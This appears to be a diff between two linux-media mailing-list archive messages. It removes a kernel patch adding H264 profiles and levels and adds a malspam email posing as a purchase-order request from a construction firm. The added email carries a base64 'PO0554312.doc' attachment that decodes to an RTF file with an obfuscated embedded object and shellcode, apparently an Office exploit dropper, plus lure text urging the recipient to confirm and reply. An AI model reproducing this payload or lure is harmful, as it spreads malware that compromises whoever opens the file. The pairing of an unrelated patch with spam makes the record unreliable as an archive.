@@ -2,110 +2,152 @@ Return-Path: <linux-media-owner@vger.kernel.org>
 X-Original-To: lists+linux-media@lfdr.de
 Delivered-To: lists+linux-media@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
-	by mail.lfdr.de (Postfix) with ESMTP id B52601875BF
-	for <lists+linux-media@lfdr.de>; Mon, 16 Mar 2020 23:43:10 +0100 (CET)
+	by mail.lfdr.de (Postfix) with ESMTP id 0B1C818762A
+	for <lists+linux-media@lfdr.de>; Tue, 17 Mar 2020 00:19:14 +0100 (CET)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1732852AbgCPWnH (ORCPT <rfc822;lists+linux-media@lfdr.de>);
-        Mon, 16 Mar 2020 18:43:07 -0400
-Received: from mail26.static.mailgun.info ([104.130.122.26]:40034 "EHLO
-        mail26.static.mailgun.info" rhost-flags-OK-OK-OK-OK)
-        by vger.kernel.org with ESMTP id S1732791AbgCPWnH (ORCPT
+        id S1732916AbgCPXTM (ORCPT <rfc822;lists+linux-media@lfdr.de>);
+        Mon, 16 Mar 2020 19:19:12 -0400
+Received: from [37.49.224.149] ([37.49.224.149]:57515 "EHLO
+        adcoconstruction.com" rhost-flags-FAIL-FAIL-OK-FAIL)
+        by vger.kernel.org with ESMTP id S1732900AbgCPXTM (ORCPT
         <rfc822;linux-media@vger.kernel.org>);
-        Mon, 16 Mar 2020 18:43:07 -0400
-DKIM-Signature: a=rsa-sha256; v=1; c=relaxed/relaxed; d=mg.codeaurora.org; q=dns/txt;
- s=smtp; t=1584398586; h=Message-Id: Date: Subject: Cc: To: From:
- Sender; bh=8RXmUUdj99K0SeMhBlE3eAxq4g+Jx7OU47A7A+eN1IM=; b=xJqpOXfNPWwxZGznKjrSXlU8Ndh7Coeaxc7/tS26GpkMa+DaDQsj+kOTfLk4fEez2U6iO0a+
- 6jRgQ+gadcpINC5FXE7P61J4a7IydSpnuAcqINV557OEEp1MdlMGlNhonU9PZHSvoMd9vDuf
- /YNMN3v2x9mMnUFTvIBjflgi7Oc=
-X-Mailgun-Sending-Ip: 104.130.122.26
-X-Mailgun-Sid: WyI3ZjU0NiIsICJsaW51eC1tZWRpYUB2Z2VyLmtlcm5lbC5vcmciLCAiYmU5ZTRhIl0=
-Received: from smtp.codeaurora.org (ec2-35-166-182-171.us-west-2.compute.amazonaws.com [35.166.182.171])
- by mxa.mailgun.org with ESMTP id 5e7000f2.7f4415630ab0-smtp-out-n03;
- Mon, 16 Mar 2020 22:42:58 -0000 (UTC)
-Received: by smtp.codeaurora.org (Postfix, from userid 1001)
-        id 594E9C433D2; Mon, 16 Mar 2020 22:42:58 +0000 (UTC)
-X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
-        aws-us-west-2-caf-mail-1.web.codeaurora.org
-X-Spam-Level: 
-X-Spam-Status: No, score=-1.0 required=2.0 tests=ALL_TRUSTED,SPF_NONE,
-        URIBL_BLOCKED autolearn=unavailable autolearn_force=no version=3.4.0
-Received: from majja-linux1.qualcomm.com (i-global254.qualcomm.com [199.106.103.254])
-        (using TLSv1.2 with cipher ECDHE-RSA-AES128-SHA256 (128/128 bits))
-        (No client certificate requested)
-        (Authenticated sender: majja)
-        by smtp.codeaurora.org (Postfix) with ESMTPSA id 9149DC433CB;
-        Mon, 16 Mar 2020 22:42:57 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.3.2 smtp.codeaurora.org 9149DC433CB
-Authentication-Results: aws-us-west-2-caf-mail-1.web.codeaurora.org; dmarc=none (p=none dis=none) header.from=codeaurora.org
-Authentication-Results: aws-us-west-2-caf-mail-1.web.codeaurora.org; spf=none smtp.mailfrom=majja@codeaurora.org
-From:   Maheshwar Ajja <majja@codeaurora.org>
-To:     mchehab@kernel.org
-Cc:     Maheshwar Ajja <majja@codeaurora.org>, linux-media@vger.kernel.org,
-        linux-kernel@vger.kernel.org
-Subject: [PATCH] media: v4l2-ctrl: Add H264 profile and levels
-Date:   Mon, 16 Mar 2020 15:42:30 -0700
-Message-Id: <1584398550-19727-1-git-send-email-majja@codeaurora.org>
-X-Mailer: git-send-email 1.9.1
+        Mon, 16 Mar 2020 19:19:12 -0400
+From:   "Christopher Hills" <chris@adcoconstruction.com>
+To:     linux-media@vger.kernel.org
+Subject: RE: NEW ORDER/DOCUMENT_0554312
+Date:   17 Mar 2020 00:19:10 +0100
+Message-ID: <20200317001910.CCBB867D16DC5B0C@adcoconstruction.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+        boundary="----=_NextPart_000_0012_96DBC440.27F442DE"
 Sender: linux-media-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <linux-media.vger.kernel.org>
 X-Mailing-List: linux-media@vger.kernel.org
 
-Add H264 profile "Contrained High" and H264 levels "5.2",
-"6.0", "6.1" and "6.2".
+This is a multi-part message in MIME format.
 
-Signed-off-by: Maheshwar Ajja <majja@codeaurora.org>
----
- drivers/media/v4l2-core/v4l2-ctrls.c | 5 +++++
- include/uapi/linux/v4l2-controls.h   | 5 +++++
- 2 files changed, 10 insertions(+)
+------=_NextPart_000_0012_96DBC440.27F442DE
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
 
-diff --git a/drivers/media/v4l2-core/v4l2-ctrls.c b/drivers/media/v4l2-core/v4l2-ctrls.c
-index 2928c5e..67ce711 100644
---- a/drivers/media/v4l2-core/v4l2-ctrls.c
-+++ b/drivers/media/v4l2-core/v4l2-ctrls.c
-@@ -336,6 +336,10 @@ const char * const *v4l2_ctrl_get_menu(u32 id)
- 		"4.2",
- 		"5",
- 		"5.1",
-+		"5.2",
-+		"6.0",
-+		"6.1",
-+		"6.2",
- 		NULL,
- 	};
- 	static const char * const h264_loop_filter[] = {
-@@ -362,6 +366,7 @@ const char * const *v4l2_ctrl_get_menu(u32 id)
- 		"Scalable High Intra",
- 		"Stereo High",
- 		"Multiview High",
-+		"Constrained High",
- 		NULL,
- 	};
- 	static const char * const vui_sar_idc[] = {
-diff --git a/include/uapi/linux/v4l2-controls.h b/include/uapi/linux/v4l2-controls.h
-index 5a7bede..fbe3f82d 100644
---- a/include/uapi/linux/v4l2-controls.h
-+++ b/include/uapi/linux/v4l2-controls.h
-@@ -467,6 +467,10 @@ enum v4l2_mpeg_video_h264_level {
- 	V4L2_MPEG_VIDEO_H264_LEVEL_4_2	= 13,
- 	V4L2_MPEG_VIDEO_H264_LEVEL_5_0	= 14,
- 	V4L2_MPEG_VIDEO_H264_LEVEL_5_1	= 15,
-+	V4L2_MPEG_VIDEO_H264_LEVEL_5_2	= 16,
-+	V4L2_MPEG_VIDEO_H264_LEVEL_6_0	= 17,
-+	V4L2_MPEG_VIDEO_H264_LEVEL_6_1	= 18,
-+	V4L2_MPEG_VIDEO_H264_LEVEL_6_2	= 19,
- };
- #define V4L2_CID_MPEG_VIDEO_H264_LOOP_FILTER_ALPHA	(V4L2_CID_MPEG_BASE+360)
- #define V4L2_CID_MPEG_VIDEO_H264_LOOP_FILTER_BETA	(V4L2_CID_MPEG_BASE+361)
-@@ -495,6 +499,7 @@ enum v4l2_mpeg_video_h264_profile {
- 	V4L2_MPEG_VIDEO_H264_PROFILE_SCALABLE_HIGH_INTRA	= 14,
- 	V4L2_MPEG_VIDEO_H264_PROFILE_STEREO_HIGH		= 15,
- 	V4L2_MPEG_VIDEO_H264_PROFILE_MULTIVIEW_HIGH		= 16,
-+	V4L2_MPEG_VIDEO_H264_PROFILE_CONSTRAINED_HIGH		= 17,
- };
- #define V4L2_CID_MPEG_VIDEO_H264_VUI_EXT_SAR_HEIGHT	(V4L2_CID_MPEG_BASE+364)
- #define V4L2_CID_MPEG_VIDEO_H264_VUI_EXT_SAR_WIDTH	(V4L2_CID_MPEG_BASE+365)
--- 
-The Qualcomm Innovation Center, Inc. is a member of the Code Aurora Forum,
-a Linux Foundation Collaborative Project
+Dear Sir/Madam,
+
+Please confirm if this requisition will be ready by 3rd April
+
+and i will send you the complete details.
+
+Kind Regards.
+
+Christopher Hills
+Purchase Manager
+Adco Constructions Pty. Ltd.
+
+
+
+I will like a receipt of your acknowledgment mail
+------=_NextPart_000_0012_96DBC440.27F442DE
+Content-Type: application/msword; name="PO0554312.doc"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="PO0554312.doc"
+
+e1xydGYxICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgIHtcb2JqZWN0e1w0ODE4Nzk0MDh9XG9iamxpbmt7XDQ4MTg3OTQw
+OH1cb2JqdzQxOTd7XDQ4MTg3OTQwOH1cb2JqaDc1MTB7XDQ4MTg3OTQwOH17XDQ4MTg3OTQw
+OH17XG9iamRhdGENXHRzZDUzNjcxOFxndXR0ZXI1ODk2ODU0NzVcJ+8gICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
+e1xvYmplY3RcTFFRR0pWSFlPVnJzbHp0eGRtc3d5aHI1NzkxMzkwNTg4MzA1OTM1MTU2MDQ5
+NUxRUUdKVkhZT1Zyc2x6dHhkbXN3eWhye1xPUFhSVVlXRUdXT1duZmxrYmxsam5qeWx5aXZw
+ZXc1MzgyMTc5MzIxMDQwNTYwODcyMzg2ODY2Mjk1T1BYUlVZV0VHV09XbmZsa2JsbGpuanls
+eWl2cGV3fX0xODZjNzg0NzAyMDAwMDAwMGIwMDAwMDA0NTUxNTU0MTU0Njk2ZjZlMntcbWxp
+bSBce1x7XG1ncm91cENocn0NZTMzMDAwMDAwMDAwMDAwMDAwMDAwYjYwODAwMDAwMzRkM2M4
+Mjg4YTkwMTA4YjhiY2I5Nzk5ZTdkZDQ4MWU5M2RlMTM3ZDQ4YjM5OGIwN2JiZDVjZDJkMTU4
+MWViMjU2NmU3MTQ4YjFiNTBmZmQzMDU5OWYwNDJkMzA1OTExMGJkMmNmZmUwNjVjZTA4NDMw
+MGI2ZTdlNmMxOGUwMjg4MjhjNDMzMjhlZjJkNmYxYTYxZDc0MDY3MGNkYWE2OGQxODVlNjU2
+NjBmNDU1ZDkwOGI2NjE2MjNhMjI0ZjVlM2I3ZTk0MGJlNzJjMzgwNTNmZDI2NjI1OTU0MjQ4
+NDk3YmM4OTg0YTg0MGJiOTM3NTMwMzhmNzdhOTVhZWJiNDk5OTA4NzA1YzMzMmRjMWI0YzQy
+Y2Q2Yzg1ZWNmMjM1MWQ0NWYxMmU1NzE5NGZhN2ZkOTk2NzZkYWVmZGNhYTNkY2Y1YjI1YWY0
+ZTdmY2Y4ZWQwOWEyMTM2YTY3NTBlZjIyNjFhY2Y5NmE1MGIyZWVmMmE3NmIxZDY1NGE0MDky
+ZGYwMjg4MGZkMjkxMGMwOTdjOTIxNzk0NWZkNjk0NjFiOTQ4NDMyZDgzMTE3YjllZGQzY2U3
+ZDI1M2VjMjE1NjdhMTM2NGMzYjg5ZjgyMDY2NzBmZGNlNDE4N2M4YzVjYTkxZTJlMTZkYmVm
+MTI1ODMyMTE1ZGEyMGZjYjQ3ZDlmYTNkMDhmZjk3YTFmZWNmNjEwNjkzZTE0YmNmMmY4Njcy
+MTA0M2QzZTQ5YTBlNmExNjljOTA4NDliM2JiZTc2Y2MwNDQ3ZjczNmEyMDk0MmExNGU5NTgw
+MTAwMDBhMGM0ZDlmYWU1NDNkNzNiNGEwOWM5NjQ3ZTk2YjMxY2E3NGYyYzk2OWZiY2ExYzAz
+MWM3OGY5MjYyMDVjOTQ2YTVlN2I5OWEyNDA1OTkxMWZhNWNiNjMyN2E4ZGI3YzQ2YTFjZDAx
+ODQyYjIwZTQwNzE1OThmNTA5NmMxYzhhNWM3ODJiZjFkY2U1MDUwNTk2ODQ5NjkwMDg0MmU0
+ZmZiOGJhNGQ3YmI5NTcxYWU3MGFkYzE5MzRmMTc2NjlhZDU4NzE0NjkwMDY3YTQ3YjkxMTI1
+MDYxNTAxZGY5ZmM0NDg5NjNjNGZlMTM3ODA1ZDA2Nzg0MWUwZjY1NzZjMzU3NjQyMTM4YzQ2
+YTgwOWMzYjc5ZWUxZGEwYzA2YzNkMWVlNWRjMTY2NDNmNGE5MWUyMWMyMGFkMTFmZjZjYmVh
+YWRkMjZhY2ViNWQ2NTMzZDUxZmE3MWY3MWYxMDg5NjA4MWM4ZTRjNjk5NjY0ZDIyNTUwMTNj
+MmQzNjZjZTExNGM3M2E2NDdmMGJiZDRiZWUwODBmNmU1NDQzMDRkODI4NWIwZmFlODkwOWQ0
+ODQ2MWE3ZmUwZGFkNTFiMTczOGMxYTYxZDg1NTcwODRjYmVkZDFlNjBmMjk4ZmFiYjgyMTIy
+MjlmNjk1N2NlNzM3MjNlMmQwNzc4OWE5ZGM4YjQ4NWY3MGRlOGEwYzE0ZGIzNGI3YTYzYzFl
+ZGQzZDExOTJmZjJmYjUwNDFhZjY4ZDAxNWQ3MDYxYzlmNmQ2NTA1MWNlNGY3ZjE0YTY3NTcx
+Y2E5MTM3ZmQ3YzIzOTExYzQ1ZDlkOTExYWNhYmFhN2U2MWNmZDVlNDU2NjA3NjlhOTA0ZWU1
+YTFlZDQ3OWU5N2I3OTY5MzRiMzk4YWFmYTA0MWVhN2UxNGI3NTc0YWUyZWQ0ZTgyYjAyMDAw
+MGU5MTUwMjAwMDBlYjYzZTk0ZjAyMDAwMGViNWNlOTI0MDIwMDAwZTlkMDAwMDAwMGViNTA5
+YzUyZWIwNDk2MmUyNGY0ODFjMjIxMTQwMDAwNTM1NjVlNWI4ZDkyZTM2MDAwMDA1YTlkZTk3
+OTAyMDAwMGU5Y2IwMDAwMDBlOWIwMDEwMDAwZTk4NDAwMDAwMDUzNWJlYjE3ZWIwMjc0YTJl
+YmM2ZTk4NDAxMDAwMGViMDVlOWRjMDIwMDAwZTk5NjAwMDAwMGViZWJlOWUwMDEwMDAwOGRh
+ZWU1MDIwMDAwOWM1MTgxYzE5ZDMwMDAwMDgxZTkzZDFlMDAwMDU5OWRlYjRhZWI2ZTljNTI1
+MDA1ZGE3MTAwMDA4ZDgwZmIyNTAwMDA1ODVhZWIwYTUxNzgyYjM5NTE5MmQ5Y2ViYzAxOWRl
+YmM3ZTkzZDAyMDAwMGViMGFhY2Y4Y2EzZTJmOTY2MTRiZThiM2U5OGEwMTAwMDBlOWNmMDAw
+MDAwZWI2OGViMzdlOTUxMDEwMDAwZTk2YjAxMDAwMDZiYzkwMGU5YTUwMDAwMDBlOTZhMDEw
+MDAwZTk2Y2ZmZmZmZmU5NDQwMjAwMDBlOWM1MDEwMDAwZTk2ZTAxMDAwMGU5MzQwMTAwMDBl
+OTRjMDEwMDAwZWIyOGU5ZDEwMDAwMDBlOTYwZmZmZmZmOTBlOWU2MDEwMDAwZTk0MmZmZmZm
+ZmViYjBlOTAzZmZmZmZmZTk3YjAxMDAwMGU5MTgwMTAwMDBlYjYwZTljZjAwMDAwMGViNzk2
+OWM5ZGQwNjU1MjRlYmI4OWM1MzgxYzM1MTA2MDAwMDgxZWI3MjQ2MDAwMDgxZWJmZTExMDAw
+MDViNTA1ODlkNTA1ODljNTdlYjBiZDgxYWIwYTdhMzNmZjQ3MzZlNTc1ZjUxODFlZmM1MTUw
+MDAwOGQ4ZjEwMWIwMDAwOGRiOWQxNmQwMDAwNTk1ZjlkZTk2ZjAxMDAwMGU5NGEwMTAwMDBl
+YmFkZTk3OWZmZmZmZjkwZTlkZGZlZmZmZmViNjZlOThiMDAwMDAwZTk2Y2ZmZmZmZmU5ODFm
+ZWZmZmZlOTIwMDEwMDAwZTliYTAwMDAwMGU5MzNmZmZmZmZlYjQxOWM1NjUxOGQ4OTBmNTEw
+MDAwOGRiNjEwMjEwMDAwOGQ4OWJhMjYwMDAwODFlZTAzM2MwMDAwNTk1ZTlkZTk2ODAxMDAw
+MGViMWNlYjc0ZTllZjAwMDAwMDM5ZWVlOTY0MDEwMDAwZWIzZGViN2NlOTNiZmZmZmZmZTlk
+MGZlZmZmZmU5ZDlmZWZmZmZlOWE5MDAwMDAwZWIyM2ViNTNlOWMwMDAwMDAwZTllN2ZlZmZm
+ZjljNTA1MDhkODBkMTA3MDAwMDJkZmQzMDAwMDA4ZDgwMWUzYjAwMDA1ODU4OWRlYjBjZWIw
+ZmU5YzJmZWZmZmZlOTdiZmVmZmZmZTk4NzAwMDAwMDVlODFjNjQ1MDMwMDAwZTk4MmZlZmZm
+ZjMxMGVlOTAwZmVmZmZmZTlhYzAwMDAwMGU5MDJmZWZmZmZlYmVkZTkxYmZlZmZmZjUyNWFl
+OWJhZmVmZmZmZTljZGZlZmZmZjgxYzEzNzk1Njc1YzljNTc1MTUxODFlOWQ1N2YwMDAwODFj
+NzIzNTQwMDAwOGRiOTg1MGIwMDAwOGQ4OTJlMDEwMDAwODFjMTI0MjcwMDAwODFlOTg5NDUw
+MDAwNTk1OTVmOWQ5MGU5NTZmZmZmZmZlYmFlZTkzNWZmZmZmZjUzNWJlOTc3ZmZmZmZmNTc1
+ZmU5MTZmZWZmZmZlOTZiZmZmZmZmZTk2ZmZlZmZmZjgzYzYwNGU5MGNmZmZmZmZlYjc3ZWJm
+NGU5MTFmZWZmZmZlOTBjZmZmZmZmZWI1MzljNTY1MzhkOWVlZjY0MDAwMDgxZWVhNjM2MDAw
+MDkwOGRiMzIyM2EwMDAwNWI1ZTlkZWJiMGU5MDlmZmZmZmZlOWUwZmVmZmZmZWJkMjljNTM4
+MWViMjI1NjAwMDA4ZDliNjE1YTAwMDA4MWMzMjEzZTAwMDA4MWMzNmE3YzAwMDA4MWMzYjYz
+ZTAwMDA4MWViNmE1ZTAwMDA1YjlkNTA1ODUzNWJlOTVmZmVmZmZmZTlmYWZlZmZmZmViYmNl
+YjAzOTA5ZDE0ZTkyOGZmZmZmZmU5MjFmZGZmZmY1NjVlZTliYWZkZmZmZjBmODJlM2ZkZmZm
+ZmI2NzllNzVlYjJhZjdkYzRlMTZkZDgxMDc0ZDM4NjBhNWJhMTdkMTBjNmQ0MTY1MTI1OGUx
+N2M0MjgzNzQ5ZGViZjJhYTA2MGYyZmI1YzNiYTllOTYxNDk3OGMyNjI2YzExOGE3Mzk4Zjkx
+YjIwNTI1MzhjMzJhZGQ5ZDA3Y2ExNDc5NTViY2ZlNzY5ZGFiNzFlNzkzZjUxYTA3YzBkNTkx
+OGVjZmIzN2I0MmQ0ZGYyM2NlYjFkMjY3ODQ4M2IxOWI3ODQ3ZTIxOGU4MDFiYjk1MDllMDdi
+ODAxYmQxZjI5MjA4NmVmZDcxMGYzZWMxZGZkZWE4NDVkYzgxNjk1MDE1N2U0OWZjNDVhZGRi
+NDUyMDEzYmU1MjYxNGNhMDI4NDdiNGQ4MDJiNjZhYjg4ZTA0NTEyZjZiMmM4NDllYWZhZGY2
+NTY3ZjhiYTZiZGYzY2M5NWY1ZDVhYmNhMTc3NGM4M2U5ZTIzMzRlZmZjYjcyOGQ2MTI5NDBm
+MGYxNGM0OGI3ZjkzZTdjMjIwNWQ3ZjVlM2NmNjJkNjI5MmI1Y2NmZTU2MmNjZTZjOTNlYTZi
+YWQ1MmNlYzMwNGEwYjU0ZDY5OGVhN2IxM2ViOTU3OWE2MWYzY2UwZDI1YjU5NGEwYTQ1ZDYz
+OGI5MWU1ZmM4NzUxMWZmNDNmMTQwYjU0YjkyNzdmOTQyMTBmMjBlYWYxNzIxZjczYjM3YjQ5
+ZDE2Nzk5YmQ5OTZiMTA2NTg2NDUxNjVkYmU3ZGM2OGI5NWFhY2ZmMjk4YWJiNWEyMDM3ZjZl
+OTAxZDdjODVjYTA5NjcyYTMwZjQ5NmRlZWY1Zjc4ZWFkMWFiNGE1OTAzOTVkZGY4N2E5ZmI4
+YWMyOTVkOTdhYjEzNWVkMjQwNGJkMGFlMGFiMDcyOGExZDZkYmNkZjJmNThjMzljN2I4ZmFi
+NjA5MGYyZTU4ZGUyYTViMTA3Zjc5YmE1ZmM2YWMyNDY5YzhiM2VmZmRmMmJlNWMwMTU1M2Qx
+MjM0MmFlMGM5OGVhYTk3Nzk5NTA0OTI3ZTM2YjE0MWJhMzQ4NzQ0ZTRhYjcwZmNjYzdkMWJk
+MjFjYTIxOWYwODEzYTcyNmU1YzA2ODk0YzJjOGM2ZDZlYjQyOWEzMDk5OWQ3ZmUyYzBmNDBl
+MmMzYzEzZDYzZWIwZDZhNTQ5ZGVkMzMxZTU1MjQ1ZWYzYTdhYTc5MGNlZjkwMWVlNWQzYTky
+MWIyMjk4MGYzNDFjOTNlMDRlMjFjOGM5YmNlN2Y5YjBjZTczMmY0ZmNmOTQ1OTUyNzhhZWU1
+MDk2NDY0OTdmZTZkODRjMGEwMjgwYmEzNDY1MDUzMTFlOTFjNTJlMDNjZDFmNTZjMGM1ZDU2
+Nzk3ZWUwYzI3YmU5OTAxNjEwOWI0OTk3N2FhYTU5MmM5NmM2YTk1MTcyMDgxNTJhOTEwMjlj
+Y2E4MTliMGViNGI0NjJiNGU4MmJlY2JiYjI5ZDhlNDVlYjhkODAwZDNjNzVmYzU2YzJmMzRl
+ZDAxOTlhM2NmYmRkMjk1MGQzZDQ0OWRmODUwMDQ3YWM5NjI4YmI4YmZiOWM3MTkzZTM5Zjhj
+MjJiMWM0YzAxZWZlNWI2ZmFkYWI0YzNhMDZjMzBhNDE3M2QyZjViMTQxOTY5M2FiMTM3YmEy
+ZTM4OTRjN2YyMTFlNDUwMzZlYmM0Y2Y3NTY2MjNjNDc2YWFkYzJkZjNjZDYwZmFlZTIwYzQx
+NWY5MDQ0YWU4NDQyZDdjMDJlM2ZlN2M0M2U3ODNjYzg1NDAwNjA4ZDgxOTFiNjU5YjUzYzJh
+YTk2NmRjM2EwOTU2ZDdhNTRiNGNlZTdjNTkxNWNjNWQyYzNkMzFlYTVkOTQ1N2VkNDM5ZmJh
+NDhmNjQzNDJlNGNhNmU5YzhmMjdiOWNjMDMzYzBlMDJkZWNlM2UwNTdkZTlmYjIzNjgxZTRl
+YTc4YmNkZDVjZTVmYzdhMzViZTYwMTQwYTlmMTUwZjMyMDAwMDAwMDB9XG9ianVwZGF0ZTk4
+MzkwMTk3Mn19
+
+------=_NextPart_000_0012_96DBC440.27F442DE--
